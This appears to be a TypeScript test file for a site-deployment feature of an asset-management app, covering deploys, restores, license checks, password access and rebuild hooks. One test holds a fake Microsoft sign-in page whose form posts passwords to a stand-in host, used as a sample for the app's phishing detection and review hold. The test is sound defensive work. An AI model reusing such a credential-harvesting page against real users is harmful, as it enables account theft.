import assert from "node:assert/strict";
import { EventEmitter } from "node:events";
import https from "node:https";
import { mock, test } from "node:test";
import { eq, sql } from "drizzle-orm";
import sharp from "sharp";
import { plan, signUp } from "@/test/db";
import { db } from "@/lib/db";
import { assets, portals, siteDeployments } from "@/lib/db/schema";
import { ingestBytes } from "@/lib/core/assets";
import { createCollection } from "@/lib/core/collections";
import { createPortal, getPortal, updatePortal } from "@/lib/core/portals";
import { rebuildSites } from "@/lib/core/rebuild";
import { resolveBrand } from "@/lib/core/brands";
import { checkBuild, deploy, HELD_DAYS, KEEP_REPLACED, listDeployments, recheckSites, restoreDeployment, siteFile, unlockValue } from "@/lib/core/sites";
import { usageOf } from "@/lib/core/usage";
import { lineage } from "@/lib/core/catalog";
import { zip } from "@/lib/zip";

const ada = await signUp("Sitesada");
const text = (s: string) => new TextEncoder().encode(s);
const pack = (files: Record<string, string>) => zip(Object.entries(files).map(([name, s]) => ({ name, data: text(s) })));
const docs = await createPortal(ada.caller, { name: "Docs", slug: `docs-${Date.now().toString(36)}`, kind: "docs" });

test("a zip goes live at its mount, and a request finds its file, its .html, then the 404 page", async () => {
  const d = (await deploy(ada.caller, docs.id, pack({ "dist/index.html": "home", "dist/guide.html": "guide", "dist/start/index.html": "start", "dist/404.html": "lost", "dist/app.js": "1" })))!;
  assert.equal(d.state, "live");
  assert.equal(d.files, 5);
  assert.equal((await siteFile(docs.slug, {}, "/"))?.status, 200);
  const file = async (rest: string) => {
    const f = await siteFile(docs.slug, {}, rest);
    return f && !("slash" in f) ? f : null;
  };
  assert.match((await file("/guide"))!.key, /guide\.html$/);
  // A folder keeps its slash, so its page's relative links resolve under it.
  assert.deepEqual(await siteFile(docs.slug, {}, "/start"), { slash: true });
  assert.match((await file("/start/"))!.key, /start\/index\.html$/);
  assert.equal((await file("/app.js"))?.contentType, "text/javascript; charset=utf-8");
  assert.equal((await siteFile(docs.slug, {}, "/nowhere"))?.status, 404);
});

test("a new deployment replaces the live one, which stays to restore", async () => {
  await deploy(ada.caller, docs.id, pack({ "index.html": "v2" }));
  const list = (await listDeployments(ada.caller, docs.id))!;
  assert.deepEqual(list.slice(0, 2).map((d) => d.state), ["live", "replaced"]);
  // Restored, the one before is live again and the new one replaced.
  assert.equal((await restoreDeployment(ada.caller, docs.id, list[1].id))?.state, "live");
  assert.deepEqual((await listDeployments(ada.caller, docs.id))!.slice(0, 2).map((d) => d.state), ["replaced", "live"]);
  await restoreDeployment(ada.caller, docs.id, list[0].id);
});

test("a password site's builds open with the door's cookie, until the password changes", async () => {
  const shut = await createPortal(ada.caller, { name: "Shut", slug: `shut-${Date.now().toString(36)}`, kind: "docs", access: "password", password: "open sesame 1" });
  await deploy(ada.caller, shut.id, pack({ "index.html": "secret" }));
  await assert.rejects(siteFile(shut.slug, {}, "/"), /needs a password/);
  const cookie = await unlockValue(shut.slug);
  assert.equal((await siteFile(shut.slug, {}, "/", cookie))?.status, 200);
  await assert.rejects(siteFile(shut.slug, {}, "/", "123.forged"), /needs a password/);
  await updatePortal(ada.caller, shut.id, { password: "open sesame 2" });
  await assert.rejects(siteFile(shut.slug, {}, "/", cookie), /needs a password/);
});

test("what can't serve is refused, and a brand portal's root stays Artbucket's", async () => {
  await assert.rejects(deploy(ada.caller, docs.id, pack({ "page.html": "x" })), /No index\.html/);
  await assert.rejects(deploy(ada.caller, docs.id, text("not a zip")), /isn't a zip/);
  await assert.rejects(deploy(ada.caller, docs.id, pack({ "index.html": "x" }), { path: "/Docs" }), /path/);
  const logos = await createCollection(ada.caller, { name: "Logos" });
  const press = await createPortal(ada.caller, { name: "Press", slug: `press-${Date.now().toString(36)}`, collections: [logos.id] });
  await assert.rejects(deploy(ada.caller, press.id, pack({ "index.html": "x" }), { kind: "docs" }), /root is drawn by Artbucket/);
  // Beside it, at a path, a build answers there and the portal keeps the rest.
  await deploy(ada.caller, press.id, pack({ "index.html": "docs" }), { path: "/docs", kind: "docs" });
  assert.deepEqual(await siteFile(press.slug, {}, "/docs"), { slash: true });
  assert.equal((await siteFile(press.slug, {}, "/docs/"))?.status, 200);
  assert.equal(await siteFile(press.slug, {}, "/"), null);
});

test("a build whose manifest names a replaced asset fails, and says which", async () => {
  const png = (background: string) => sharp({ create: { width: 4, height: 4, channels: 3, background } }).png().toBuffer();
  const old = (await ingestBytes(ada.caller, { bytes: await png("#123456"), mime: "image/png", filename: "old-logo.png" })).asset;
  const now = (await ingestBytes(ada.caller, { bytes: await png("#654321"), mime: "image/png", filename: "logo.png" })).asset;
  await db.update(assets).set({ supersededBy: now.id }).where(eq(assets.id, old.id));
  await assert.rejects(deploy(ada.caller, docs.id, pack({ "index.html": "x", "artbucket.site.json": JSON.stringify({ assets: [old.id] }) })), /old-logo\.png was replaced/);
  assert.equal((await listDeployments(ada.caller, docs.id))![0].state, "failed");
  // The one live before is still what answers.
  assert.equal((await siteFile(docs.slug, {}, "/"))?.status, 200);
});

test("a live build's manifest is its lineage: the assets it names and its brand flow into the site", async () => {
  const png = await sharp({ create: { width: 4, height: 4, channels: 3, background: "#0a7f3c" } }).png().toBuffer();
  const mark = (await ingestBytes(ada.caller, { bytes: png, mime: "image/png", filename: "mark.png" })).asset;
  const site = await createPortal(ada.caller, { name: "Landing", slug: `landing-${Date.now().toString(36)}`, kind: "landing" });
  await deploy(ada.caller, site.id, pack({ "index.html": "hi", "artbucket.site.json": JSON.stringify({ brand: "default", assets: [mark.id] }) }));
  const l = (await lineage(ada.caller, mark.id, { depth: 1, direction: ["down"] }))!;
  assert.ok(l.edges.some((e) => e.to === site.id && e.kind === "built" && e.via === "/"));
  const b = (await lineage(ada.caller, `${ada.caller.project.organization.slug}/${ada.caller.project.slug}/brand/default`, { depth: 1, direction: ["down"] }))!;
  assert.ok(b.nodes.some((n) => n.id === site.id));
});

test("builds count as storage, and only a few replaced are kept per path", async () => {
  const site = await createPortal(ada.caller, { name: "Many", slug: `many-${Date.now().toString(36)}`, kind: "docs" });
  const before = (await usageOf(ada.caller)).used.storage;
  for (let i = 0; i < KEEP_REPLACED + 3; i++) await deploy(ada.caller, site.id, pack({ "index.html": "x".repeat(1000) }));
  const list = (await listDeployments(ada.caller, site.id))!;
  assert.deepEqual(list.map((d) => d.state), ["live", ...Array(KEEP_REPLACED).fill("replaced")]);
  assert.equal((await usageOf(ada.caller)).used.storage - before, (KEEP_REPLACED + 1) * 1000);
});

test("every file is matched against the library: a copy or a pinned link of a replaced or expired asset fails, with no manifest", async () => {
  const png = (background: string) => sharp({ create: { width: 4, height: 4, channels: 3, background } }).png().toBuffer();
  const oldBytes = await png("#a1b2c3");
  const old = (await ingestBytes(ada.caller, { bytes: oldBytes, mime: "image/png", filename: "logo-2024.png" })).asset;
  const now = (await ingestBytes(ada.caller, { bytes: await png("#c3b2a1"), mime: "image/png", filename: "logo-2026.png" })).asset;
  await db.update(assets).set({ supersededBy: now.id }).where(eq(assets.id, old.id));
  const site = await createPortal(ada.caller, { name: "Scanned", slug: `scanned-${Date.now().toString(36)}`, kind: "landing" });
  const files = (extra: Record<string, Uint8Array | string>) =>
    zip(Object.entries({ "index.html": "<h1>hi</h1>", ...extra }).map(([name, d]) => ({ name, data: typeof d === "string" ? text(d) : d })));

  // A copied file: refused, naming the file and what replaced it.
  await assert.rejects(deploy(ada.caller, site.id, files({ "img/logo.png": oldBytes })), (e: Error) => /logo-2024\.png was replaced by logo-2026\.png/.test(e.message) && /img\/logo\.png is a copy of it/.test(e.message) && e.message.includes(now.id));
  // A pinned link to the old version: refused too.
  await assert.rejects(deploy(ada.caller, site.id, files({ "index.html": `<img src="/a/${old.id}/w_200">` })), /index\.html links it/);
  // An expired license, through a link.
  const photo = (await ingestBytes(ada.caller, { bytes: await png("#0f0f0f"), mime: "image/png", filename: "photo.png" })).asset;
  await db.update(assets).set({ rights: { license: "RM", territories: [], channels: [], embargo: null, expires: "2020-01-01", modelRelease: null } }).where(eq(assets.id, photo.id));
  await assert.rejects(deploy(ada.caller, site.id, files({ "about.html": `<img src="https://app.example.com/a/${photo.id}">` })), /photo\.png can't be used: License expired after 2020-01-01: about\.html links it/);

  // /c/ follows the stack, so the old id there shows the new logo: live, and its lineage is the version it serves.
  const d = (await deploy(ada.caller, site.id, files({ "index.html": `<img src="/c/${old.id}">`, "css/site.css": "body{}" })))!;
  assert.equal(d.state, "live");
  assert.deepEqual(d.uses, [{ asset: now.id, how: "current", file: "index.html" }]);
  const l = (await lineage(ada.caller, now.id, { depth: 1, direction: ["down"] }))!;
  assert.ok(l.edges.some((e) => e.to === site.id && e.kind === "built"));

  // A copy of what may be used goes live, and is lineage too.
  const ok = (await deploy(ada.caller, site.id, files({ "logo.png": await png("#c3b2a1") })))!;
  assert.deepEqual(ok.uses, [{ asset: now.id, how: "copy", file: "logo.png" }]);
});

test("an address of an asset that isn't the project's is left alone", async () => {
  const site = await createPortal(ada.caller, { name: "Elsewhere", slug: `elsewhere-${Date.now().toString(36)}`, kind: "docs" });
  const d = (await deploy(ada.caller, site.id, pack({ "index.html": `<img src="https://other.example/a/0b6c2f0e-6a52-4a5e-9d3b-1f1a2c3d4e5f">` })))!;
  assert.equal(d.state, "live");
  assert.deepEqual(d.uses, []);
});

test("live builds are checked again: a license that ended since shows on the deployment, and clears once fixed", async () => {
  const png = await sharp({ create: { width: 4, height: 4, channels: 3, background: "#5a5a10" } }).png().toBuffer();
  const photo = (await ingestBytes(ada.caller, { bytes: png, mime: "image/png", filename: "campaign.png" })).asset;
  const rights = (expires: string) => ({ license: "RM", territories: [], channels: [], embargo: null, expires, modelRelease: null });
  await db.update(assets).set({ rights: rights("2099-01-01") }).where(eq(assets.id, photo.id));
  const site = await createPortal(ada.caller, { name: "Campaign", slug: `campaign-${Date.now().toString(36)}`, kind: "landing" });
  const d = (await deploy(ada.caller, site.id, pack({ "index.html": `<img src="/a/${photo.id}/w_800">` })))!;
  assert.deepEqual(d.problems, []);

  // The license ends; the next re-check of a build due for one says so, and the build stays live.
  await db.update(assets).set({ rights: rights("2026-01-01") }).where(eq(assets.id, photo.id));
  await db.update(siteDeployments).set({ checkedAt: null }).where(eq(siteDeployments.id, d.id));
  const run = await recheckSites("2026-06-01");
  assert.ok(run.checked >= 1 && run.troubled >= 1);
  const [after] = (await listDeployments(ada.caller, site.id))!;
  assert.equal(after.state, "live");
  assert.deepEqual(after.problems, ["campaign.png can't be used: License expired after 2026-01-01: index.html links it"]);

  // Renewed, the next re-check clears it; one checked lately waits its turn.
  await db.update(assets).set({ rights: rights("2099-01-01") }).where(eq(assets.id, photo.id));
  await recheckSites("2026-06-01");
  assert.equal((await listDeployments(ada.caller, site.id))![0].problems.length, 1);
  await db.update(siteDeployments).set({ checkedAt: null }).where(eq(siteDeployments.id, d.id));
  await recheckSites("2026-06-01");
  assert.deepEqual((await listDeployments(ada.caller, site.id))![0].problems, []);
});

test("a build hosted elsewhere is checked the same way, and nothing is stored", async () => {
  const png = (background: string) => sharp({ create: { width: 4, height: 4, channels: 3, background } }).png().toBuffer();
  const oldBytes = await png("#2b3c4d");
  const old = (await ingestBytes(ada.caller, { bytes: oldBytes, mime: "image/png", filename: "badge-v1.png" })).asset;
  const now = (await ingestBytes(ada.caller, { bytes: await png("#4d3c2b"), mime: "image/png", filename: "badge-v2.png" })).asset;
  await db.update(assets).set({ supersededBy: now.id }).where(eq(assets.id, old.id));
  const files = (f: Record<string, Uint8Array | string>) => zip(Object.entries(f).map(([name, d]) => ({ name, data: typeof d === "string" ? text(d) : d })));
  const before = (await usageOf(ada.caller)).used.storage;

  const refused = await checkBuild(ada.caller, files({ "out/docs/img/badge.png": oldBytes, "out/docs/page.html": "no index needed" }));
  assert.equal(refused.allowed, false);
  assert.equal(refused.files, 2);
  assert.match(refused.problems[0], /badge-v1\.png was replaced by badge-v2\.png .*docs\/img\/badge\.png is a copy of it/);

  const fine = await checkBuild(ada.caller, files({ "index.html": `<img src="/c/${old.id}">` }));
  assert.deepEqual(fine, { allowed: true, files: 1, uses: [{ asset: now.id, how: "current", file: "index.html" }], problems: [], flags: [] });
  await assert.rejects(checkBuild(ada.caller, files({ "artbucket.site.json": "{not json" })), /isn't JSON/);
  assert.equal((await usageOf(ada.caller)).used.storage, before);
});

test("a build that looks like phishing is held where the operator reviews, live with its flags elsewhere, and released by the operator", async () => {
  const fake = `<title>Sign in</title><h1>Microsoft</h1><form action="https://collect.example/p"><input type="email"><input type="password"></form>`;
  const newsletter = `<h1>Acme docs</h1><form action="https://list.example/subscribe"><input type="email" name="email"></form>`;

  // Here nobody reviews: it goes live, its flags noted.
  const open = await createPortal(ada.caller, { name: "Open", slug: `open-${Date.now().toString(36)}`, kind: "landing" });
  const live = (await deploy(ada.caller, open.id, pack({ "index.html": fake })))!;
  assert.equal(live.state, "live");
  assert.deepEqual(live.flags, ["index.html asks for a password, on a page that looks like Microsoft's"]);

  // A new organization on a tier the operator reviews.
  const eve = await signUp("Sitereview");
  await plan(eve.caller.project.organizationId, { siteReview: true });
  const site = await createPortal(eve.caller, { name: "Login", slug: `login-${Date.now().toString(36)}`, kind: "landing" });
  const held = (await deploy(eve.caller, site.id, pack({ "index.html": fake })))!;
  assert.equal(held.state, "held");
  assert.match(held.error!, /^Held for review: index\.html asks for a password, on a page that looks like Microsoft's/);
  assert.equal(await siteFile(site.slug, {}, "/"), null);
  // A newsletter form is a brand's site like any other.
  const docs = await createPortal(eve.caller, { name: "News", slug: `news-${Date.now().toString(36)}`, kind: "docs" });
  assert.equal((await deploy(eve.caller, docs.id, pack({ "index.html": newsletter })))!.state, "live");

  // The operator releases it, with the statements the guide gives.
  await db.transaction(async (tx) => {
    await tx.execute(sql`update site_deployments set state = 'replaced'
      where state = 'live' and (site_id, path) = (select site_id, path from site_deployments where id = ${held.id} and state = 'held')`);
    await tx.execute(sql`update site_deployments set state = 'live', error = null where id = ${held.id} and state = 'held'`);
  });
  assert.equal((await siteFile(site.slug, {}, "/"))?.status, 200);
});

test("a copy of a draft is the site's own; a restored build is checked as it comes back; a held one nobody reviews is refused", async () => {
  const png = (background: string) => sharp({ create: { width: 4, height: 4, channels: 3, background } }).png().toBuffer();
  const bytes = await png("#77aa11");
  const draft = (await ingestBytes(ada.caller, { bytes, mime: "image/png", filename: "wip.png" })).asset;
  await db.update(assets).set({ status: "draft" }).where(eq(assets.id, draft.id));
  const site = await createPortal(ada.caller, { name: "Drafty", slug: `drafty-${Date.now().toString(36)}`, kind: "landing" });
  const first = (await deploy(ada.caller, site.id, zip([{ name: "index.html", data: text("hi") }, { name: "wip.png", data: bytes }])))!;
  assert.equal(first.state, "live");
  // A link to it is the library's word, though: refused.
  await assert.rejects(deploy(ada.caller, site.id, pack({ "index.html": `<img src="/a/${draft.id}">` })), /wip\.png isn't approved/);

  // Replaced by a second build, then the library archives a photo the first one copied: restoring it says so at once.
  const photo = (await ingestBytes(ada.caller, { bytes: await png("#1188aa"), mime: "image/png", filename: "team.png" })).asset;
  const one = (await deploy(ada.caller, site.id, zip([{ name: "index.html", data: text("v1") }, { name: "team.png", data: await png("#1188aa") }])))!;
  await deploy(ada.caller, site.id, pack({ "index.html": "v2" }));
  await db.update(assets).set({ status: "archived" }).where(eq(assets.id, photo.id));
  const back = (await restoreDeployment(ada.caller, site.id, one.id))!;
  assert.equal(back.state, "live");
  assert.deepEqual(back.problems, ["team.png is archived: team.png is a copy of it"]);

  // Held past HELD_DAYS: refused by the re-check, its files no longer kept.
  const eve = await signUp("Heldlong");
  await plan(eve.caller.project.organizationId, { siteReview: true });
  const shady = await createPortal(eve.caller, { name: "Shady", slug: `shady-${Date.now().toString(36)}`, kind: "landing" });
  const held = (await deploy(eve.caller, shady.id, pack({ "index.html": `<input type="password">` })))!;
  assert.equal(held.state, "held");
  await db.update(siteDeployments).set({ createdAt: new Date(Date.now() - (HELD_DAYS + 1) * 864e5) }).where(eq(siteDeployments.id, held.id));
  await recheckSites();
  const [after] = (await listDeployments(eve.caller, shady.id))!;
  assert.equal(after.state, "failed");
  assert.match(after.error!, /Not reviewed within 14 days/);
});

test("a check names only what the caller may see: a private asset's copy is not theirs to hear about", async () => {
  const png = await sharp({ create: { width: 4, height: 4, channels: 3, background: "#33aa77" } }).png().toBuffer();
  const secret = (await ingestBytes(ada.caller, { bytes: png, mime: "image/png", filename: "unannounced.png" })).asset;
  await db.update(assets).set({ private: true, status: "archived" }).where(eq(assets.id, secret.id));
  const files = zip([{ name: "x.png", data: png }]);
  // An admin hears about it; a reader of the project, for whom it is private, gets nothing of it back.
  assert.equal((await checkBuild(ada.caller, files)).allowed, false);
  const reader = { ...ada.caller, scope: "read" as const };
  assert.deepEqual(await checkBuild(reader, files), { allowed: true, files: 1, uses: [], problems: [], flags: [] });
});

test("a release calls the deploy hook of each site built from the brand, and the site says what it answered", async (t) => {
  const calls: { url: string; body: unknown }[] = [];
  t.after(() => mock.restoreAll());
  mock.method(https, "request", (url: URL, _opts: unknown, cb: (res: unknown) => void) => {
    const req = Object.assign(new EventEmitter(), {
      end: (data: Buffer) => {
        calls.push({ url: url.toString(), body: JSON.parse(data.toString()) });
        queueMicrotask(() => cb(Object.assign(new EventEmitter(), { statusCode: 201, resume() {} })));
      },
      destroy() {},
    });
    return req;
  });
  const hook = "https://api.vercel.com/v1/integrations/deploy/prj_abc/secret123";
  await assert.rejects(createPortal(ada.caller, { name: "Nope", slug: `nope-${Date.now().toString(36)}`, kind: "docs", rebuild: { url: hook, brand: "no-such" } }), /no brand "no-such"/);
  const site = await createPortal(ada.caller, { name: "On Vercel", slug: `vercel-${Date.now().toString(36)}`, kind: "docs", rebuild: { url: hook, brand: "default" } });
  // The URL is the key to start a build: never shown again.
  assert.deepEqual(site.rebuild, { brand: "default", host: "api.vercel.com", lastAt: null, lastStatus: null });
  assert.ok(!JSON.stringify(site).includes("secret123"));
  const [row] = await db.select({ hook: portals.rebuildHook }).from(portals).where(eq(portals.id, site.id));
  assert.ok(row.hook && !row.hook.includes("secret123"));

  const brand = await resolveBrand(ada.caller.project.id, "default");
  assert.deepEqual(await rebuildSites(brand.id, { number: 7, note: "Bluer primary" }), [{ site: site.slug, status: "201" }]);
  assert.deepEqual(calls, [{ url: hook, body: { event: "brand.released", brand: "default", release: 7, note: "Bluer primary", site: site.slug } }]);
  const after = (await getPortal(ada.caller, site.id))!;
  assert.equal(after.rebuild?.lastStatus, "201");
  assert.ok(after.rebuild?.lastAt);
  // A site on Vercel is in the brand's lineage, though nothing of it is deployed here.
  const l = (await lineage(ada.caller, brand.id, { depth: 1, direction: ["down"] }))!;
  assert.ok(l.edges.some((e) => e.to === site.id && e.kind === "built"));

  // Cleared: nothing is called, and the lineage forgets it.
  await updatePortal(ada.caller, site.id, { rebuild: null });
  assert.deepEqual(await rebuildSites(brand.id, { number: 8 }), []);
  assert.equal((await getPortal(ada.caller, site.id))!.rebuild, null);
});
